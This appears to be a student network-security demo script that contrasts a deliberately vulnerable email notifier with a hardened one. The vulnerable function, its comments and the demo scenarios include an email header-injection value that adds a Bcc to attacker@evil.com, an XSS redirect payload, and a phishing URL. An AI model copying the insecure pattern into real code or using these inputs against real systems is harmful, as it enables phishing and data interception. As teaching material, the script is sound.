"""
email_demo.py — Email Security Demo
Campus Event Portal — Network Security Assignment
Team: Fadil · Rafi · Akbar · Torikh

Demonstrates:
  1. VULNERABLE email notification (susceptible to phishing, header injection,
     open redirect, no authentication headers)
  2. SECURE email notification (anti-phishing controls, input sanitization,
     DKIM/SPF-ready configuration, strict sender identity)

Run:
  python src/email_demo.py
"""

import smtplib
import re
import html
import logging
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formataddr, formatdate, make_msgid
from urllib.parse import urlencode, urlparse

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s"
)
logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants — would normally live in env vars / config
# ---------------------------------------------------------------------------
DOMAIN           = "events.youruniversity.edu"
SENDER_NAME      = "Campus Event Portal"
SENDER_ADDRESS   = f"no-reply@{DOMAIN}"
SMTP_HOST        = "mail.youruniversity.edu"   # fictional
SMTP_PORT        = 587                          # STARTTLS
ALLOWED_REDIRECT_DOMAIN = DOMAIN               # whitelist for redirect URLs

# ---------------------------------------------------------------------------
# ============================================================
# PART 1: VULNERABLE EMAIL IMPLEMENTATION
# ============================================================
# ---------------------------------------------------------------------------

def send_event_notification_VULNERABLE(user_email: str, event_name: str, event_url: str):
    """
    VULNERABLE: Email notification with multiple security flaws.

    Vulnerabilities demonstrated:
      [V1] Header Injection  — user input directly injected into email headers
      [V2] Open Redirect     — unvalidated URL passed directly into email body
      [V3] No TLS            — email sent over plain SMTP (port 25, no encryption)
      [V4] HTML Injection    — event_name not escaped, allows XSS in HTML email
      [V5] No sender auth    — no DKIM/SPF awareness, easy to spoof
      [V6] Misleading links  — display text != actual href (phishing pattern)
    """
    print("\n" + "="*60)
    print("VULNERABLE EMAIL DEMO")
    print("="*60)

    # [V1] HEADER INJECTION: attacker can pass:
    #   user_email = "victim@uni.edu\nBcc: attacker@evil.com"
    # This injects a Bcc header, silently CC-ing the attacker.
    to_header = user_email  # NO VALIDATION

    # [V4] HTML INJECTION: event_name not sanitized.
    # Attacker event name: '<script>alert("xss")</script>'
    # Or: '<img src=x onerror=document.location="https://evil.com">'
    body_html = f"""
    <html><body>
        <p>You have registered for: <b>{event_name}</b></p>
        <p><a href="{event_url}">Click here to view the event</a></p>
        <p>If you did not register, ignore this email.</p>
    </body></html>
    """

    # [V2] OPEN REDIRECT: event_url is never validated.
    # Attacker can supply: https://evil.com/phishing-page
    # User receives email that looks like it's from uni but leads to evil.com

    # [V6] MISLEADING LINK: display text says "events.youruniversity.edu"
    # but href could point anywhere — classic phishing technique
    phishing_body = f"""
    <html><body>
        <p>Click to confirm registration:</p>
        <a href="{event_url}">events.youruniversity.edu/confirm</a>
    </body></html>
    """
    # ^ Display text looks legitimate, actual link is whatever attacker passed in

    msg = MIMEMultipart("alternative")
    msg["Subject"] = f"Event Registration: {event_name}"
    msg["From"]    = SENDER_ADDRESS      # easily spoofed — no DKIM signing
    msg["To"]      = to_header           # [V1] raw user input in header
    msg.attach(MIMEText(phishing_body, "html"))

    # [V3] NO TLS: port 25, no encryption, no authentication
    # Any network observer (or ISP) can read the email content
    try:
        with smtplib.SMTP(SMTP_HOST, 25) as server:  # port 25 = plain SMTP
            # No starttls() call — all traffic is plaintext
            server.sendmail(SENDER_ADDRESS, [user_email], msg.as_string())
        print("[VULNERABLE] Email sent (insecurely)")
    except Exception as e:
        print(f"[VULNERABLE] SMTP error (expected in demo — no real server): {e}")

    print("\n[VULNERABLE] Issues present in this implementation:")
    print("  [V1] Header Injection  — user_email inserted raw into To: header")
    print("  [V2] Open Redirect     — event_url not validated, can point to evil.com")
    print("  [V3] No TLS            — plain SMTP port 25, no encryption")
    print("  [V4] HTML Injection    — event_name not escaped (XSS in HTML email)")
    print("  [V5] No sender auth    — sender address trivially spoofed")
    print("  [V6] Misleading links  — display text != actual href (phishing pattern)")
    print("="*60)


# ---------------------------------------------------------------------------
# ============================================================
# PART 2: SECURE EMAIL IMPLEMENTATION
# ============================================================
# ---------------------------------------------------------------------------

# --- Input Validators ---

def validate_email_address(email: str) -> str:
    """
    Validate email format AND check for header injection characters.
    Returns cleaned email or raises ValueError.

    Security: Newlines and carriage returns in email addresses are
    used for SMTP header injection attacks.
    """
    if not email or not isinstance(email, str):
        raise ValueError("Email must be a non-empty string")

    # Strip whitespace
    email = email.strip()

    # [S1] Block header injection — reject any email containing CRLF
    if "\n" in email or "\r" in email or "\0" in email:
        raise ValueError(f"Invalid email address: contains illegal characters (header injection attempt)")

    # [S1] Validate email format with strict regex
    # Per RFC 5321, simplified for practical use
    pattern = r'^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$'
    if not re.match(pattern, email):
        raise ValueError(f"Invalid email format: '{email}'")

    # [S1] Length limit (RFC 5321: 320 max)
    if len(email) > 320:
        raise ValueError("Email address too long")

    return email


def validate_redirect_url(url: str, allowed_domain: str = ALLOWED_REDIRECT_DOMAIN) -> str:
    """
    Validate that a URL belongs to an allowed domain (whitelist).

    Prevents open redirect attacks where attacker-controlled URLs
    are embedded in emails to redirect users to phishing sites.
    """
    if not url or not isinstance(url, str):
        raise ValueError("URL must be a non-empty string")

    try:
        parsed = urlparse(url)
    except Exception:
        raise ValueError(f"Malformed URL: '{url}'")

    # [S2] Only allow HTTPS
    if parsed.scheme != "https":
        raise ValueError(f"URL must use HTTPS, got: '{parsed.scheme}'")

    # [S2] Enforce domain whitelist — exact match or subdomain of allowed domain
    hostname = parsed.netloc.lower().split(":")[0]  # strip port if present
    if hostname != allowed_domain and not hostname.endswith(f".{allowed_domain}"):
        raise ValueError(
            f"URL domain '{hostname}' is not whitelisted. "
            f"Only '{allowed_domain}' and its subdomains are allowed."
        )

    return url


def sanitize_display_text(text: str, max_length: int = 200) -> str:
    """
    Escape HTML special characters and enforce length limit.
    Use for any user-supplied content rendered inside HTML email body.
    """
    if not isinstance(text, str):
        text = str(text)

    # [S4] Escape HTML to prevent XSS / HTML injection in email body
    sanitized = html.escape(text, quote=True)

    # [S4] Enforce length limit
    if len(sanitized) > max_length:
        sanitized = sanitized[:max_length] + "..."

    return sanitized


def build_secure_html_body(event_name_safe: str, event_url_safe: str) -> str:
    """
    Build a secure HTML email body.

    Anti-phishing measures:
      - Display URL explicitly shown (user can verify destination)
      - Consistent sender identity and branding
      - No external images (tracking pixel prevention)
      - Explicit disclaimer with contact info
    """
    return f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- [S5] Content-Security-Policy in HTML email header (limited support,
              but signals intent and some clients respect it) -->
    <meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'none';">
    <title>Event Registration Confirmation</title>
</head>
<body style="font-family: Arial, sans-serif; max-width: 600px; margin: auto; color: #333;">

    <!-- Explicit sender branding — anti-phishing trust signal -->
    <div style="background: #003366; padding: 16px; border-radius: 4px 4px 0 0;">
        <h1 style="color: #ffffff; font-size: 18px; margin: 0;">
            Campus Event Portal — {DOMAIN}
        </h1>
    </div>

    <div style="padding: 24px; border: 1px solid #ddd; border-top: none;">
        <p>Your registration has been confirmed for:</p>

        <!-- [S4] event_name_safe is HTML-escaped — no XSS possible -->
        <p style="font-size: 18px; font-weight: bold; color: #003366;">
            {event_name_safe}
        </p>

        <p>You can view event details at the following link:</p>

        <!-- [S6] ANTI-PHISHING: Display the actual URL as visible text.
             The href and the link text are identical — user can verify destination.
             Contrast with VULNERABLE version where display text was fake. -->
        <p style="background: #f5f5f5; padding: 12px; border-radius: 4px;
                  word-break: break-all; font-family: monospace;">
            <a href="{event_url_safe}" style="color: #003366;">
                {event_url_safe}
            </a>
        </p>

        <hr style="border: none; border-top: 1px solid #eee; margin: 24px 0;">

        <!-- Explicit legitimacy statement — helps users identify phishing -->
        <p style="font-size: 12px; color: #666;">
            This email was sent by the official Campus Event Portal at
            <strong>{DOMAIN}</strong>.<br>
            If you did not register for this event, please contact
            <a href="mailto:support@{DOMAIN}">support@{DOMAIN}</a>
            immediately.<br><br>
            <strong>We will never ask for your password via email.</strong>
        </p>
    </div>
</body>
</html>
"""


def send_event_notification_SECURE(user_email: str, event_name: str, event_url: str):
    """
    SECURE: Email notification with anti-phishing and injection protections.

    Security controls applied:
      [S1] Header Injection Prevention — validate email before inserting into headers
      [S2] Open Redirect Prevention    — whitelist-validate event_url domain
      [S3] TLS Enforcement             — STARTTLS on port 587
      [S4] HTML Escaping               — sanitize all user content in HTML body
      [S5] Explicit sender identity    — proper From/Reply-To headers
      [S6] Anti-phishing links         — display URL = actual URL (no deception)
      [S7] Message-ID & Date headers   — standard headers for DKIM signing alignment
    """
    print("\n" + "="*60)
    print("SECURE EMAIL DEMO")
    print("="*60)

    # --- INPUT VALIDATION PHASE ---
    try:
        # [S1] Validate and sanitize email address (blocks header injection)
        safe_email = validate_email_address(user_email)
        logger.info(f"Email address validated: {safe_email}")

        # [S2] Validate event URL (blocks open redirect to evil.com)
        safe_url = validate_redirect_url(event_url, ALLOWED_REDIRECT_DOMAIN)
        logger.info(f"Event URL validated: {safe_url}")

        # [S4] Sanitize event name for HTML output (blocks XSS in email body)
        safe_event_name = sanitize_display_text(event_name, max_length=150)
        logger.info(f"Event name sanitized: {safe_event_name}")

    except ValueError as e:
        logger.error(f"[SECURE] Input validation FAILED: {e}")
        print(f"[SECURE] Email NOT sent — validation error: {e}")
        print("="*60)
        return

    # --- BUILD EMAIL ---
    msg = MIMEMultipart("alternative")

    # [S5] Proper From header with display name — hard to spoof when DKIM is active
    msg["From"]       = formataddr((SENDER_NAME, SENDER_ADDRESS))
    msg["Reply-To"]   = formataddr(("Campus Event Support", f"support@{DOMAIN}"))
    msg["To"]         = safe_email
    msg["Subject"]    = f"[Campus Event Portal] Registration Confirmed: {safe_event_name}"
    msg["Date"]       = formatdate(localtime=True)
    # [S7] Unique Message-ID — required for proper DKIM body hash
    msg["Message-ID"] = make_msgid(domain=DOMAIN)
    # [S5] List-Unsubscribe header — required by Google/Yahoo bulk sender guidelines
    msg["List-Unsubscribe"] = f"<mailto:unsubscribe@{DOMAIN}?subject=unsubscribe>"

    # Plain text fallback (important for accessibility and anti-spam scoring)
    plain_body = (
        f"Your registration for '{safe_event_name}' is confirmed.\n\n"
        f"View event: {safe_url}\n\n"
        f"If you did not register, contact support@{DOMAIN}\n"
        f"We will never ask for your password via email.\n"
    )
    msg.attach(MIMEText(plain_body, "plain"))

    # [S4][S6] Secure HTML body with escaped content and honest links
    html_body = build_secure_html_body(safe_event_name, safe_url)
    msg.attach(MIMEText(html_body, "html"))

    # --- SEND WITH TLS ---
    try:
        # [S3] Port 587 + STARTTLS — encrypts the connection before sending credentials
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=10) as server:
            server.ehlo()
            server.starttls()   # Upgrade to TLS — all subsequent traffic is encrypted
            server.ehlo()       # Re-identify after TLS upgrade
            # In production: server.login(SMTP_USER, SMTP_PASSWORD)
            # Credentials loaded from environment variables, NEVER hardcoded
            server.sendmail(SENDER_ADDRESS, [safe_email], msg.as_string())
        logger.info(f"[SECURE] Email sent to {safe_email} via TLS")
        print(f"[SECURE] Email sent successfully to: {safe_email}")
    except smtplib.SMTPException as e:
        logger.error(f"[SECURE] SMTP error (expected in demo — no real server): {e}")
        print(f"[SECURE] SMTP error (expected in demo — no real server): {e}")

    print("\n[SECURE] Controls applied in this implementation:")
    print("  [S1] Header Injection  — email validated with regex + CRLF rejection")
    print("  [S2] Open Redirect     — URL whitelisted to events.youruniversity.edu only")
    print("  [S3] TLS Enforcement   — port 587 + STARTTLS (encrypted channel)")
    print("  [S4] HTML Escaping     — event_name HTML-escaped before rendering")
    print("  [S5] Sender Identity   — proper From/Reply-To with domain branding")
    print("  [S6] Anti-phishing     — link display text = actual href URL")
    print("  [S7] DKIM-ready        — Message-ID + Date headers for signing")
    print("="*60)


# ---------------------------------------------------------------------------
# DEMO RUNNER
# ---------------------------------------------------------------------------

def run_demo():
    print("\n" + "#"*60)
    print("#  EMAIL SECURITY DEMO — Campus Event Portal")
    print("#  Shows: Vulnerable vs. Secure email notifications")
    print("#"*60)

    # --- Scenario 1: Normal input (both should "work") ---
    print("\n\n--- SCENARIO 1: Normal Inputs ---")
    normal_email    = "student@youruniversity.edu"
    normal_event    = "Annual Tech Symposium 2024"
    normal_url      = "https://events.youruniversity.edu/events/42"

    send_event_notification_VULNERABLE(normal_email, normal_event, normal_url)
    send_event_notification_SECURE(normal_email, normal_event, normal_url)

    # --- Scenario 2: Header Injection Attack ---
    print("\n\n--- SCENARIO 2: Header Injection Attack ---")
    print("Attacker-supplied email: 'victim@uni.edu\\nBcc: attacker@evil.com'")
    injected_email = "victim@uni.edu\nBcc: attacker@evil.com"
    event_name     = "Free Pizza Event"
    event_url      = "https://events.youruniversity.edu/events/99"

    print("\n[VULNERABLE] — Passes injected email directly to header:")
    send_event_notification_VULNERABLE(injected_email, event_name, event_url)

    print("\n[SECURE] — Rejects injected email at validation stage:")
    send_event_notification_SECURE(injected_email, event_name, event_url)

    # --- Scenario 3: Open Redirect / Phishing URL ---
    print("\n\n--- SCENARIO 3: Open Redirect / Phishing URL Attack ---")
    print("Attacker-supplied URL: 'https://evil-phishing.com/fake-login'")
    normal_email2   = "student2@youruniversity.edu"
    event_name2     = "Scholarship Application Workshop"
    phishing_url    = "https://evil-phishing.com/fake-campus-login"

    print("\n[VULNERABLE] — Embeds phishing URL in email link:")
    send_event_notification_VULNERABLE(normal_email2, event_name2, phishing_url)

    print("\n[SECURE] — Rejects non-whitelisted domain:")
    send_event_notification_SECURE(normal_email2, event_name2, phishing_url)

    # --- Scenario 4: HTML/XSS Injection in Event Name ---
    print("\n\n--- SCENARIO 4: HTML Injection in Event Name ---")
    print("Attacker event name: '<script>alert(\"xss\")</script>'")
    normal_email3   = "student3@youruniversity.edu"
    xss_event_name  = '<script>alert("xss")</script> Hacker Meetup'
    normal_url3     = "https://events.youruniversity.edu/events/666"

    print("\n[VULNERABLE] — XSS payload rendered raw in HTML email:")
    send_event_notification_VULNERABLE(normal_email3, xss_event_name, normal_url3)

    print("\n[SECURE] — Payload HTML-escaped, rendered as literal text:")
    send_event_notification_SECURE(normal_email3, xss_event_name, normal_url3)

    print("\n\n" + "#"*60)
    print("#  DEMO COMPLETE")
    print("#  See docs/dns_records.txt for SPF/DKIM/DMARC configuration")
    print("#"*60 + "\n")


if __name__ == "__main__":
    run_demo()
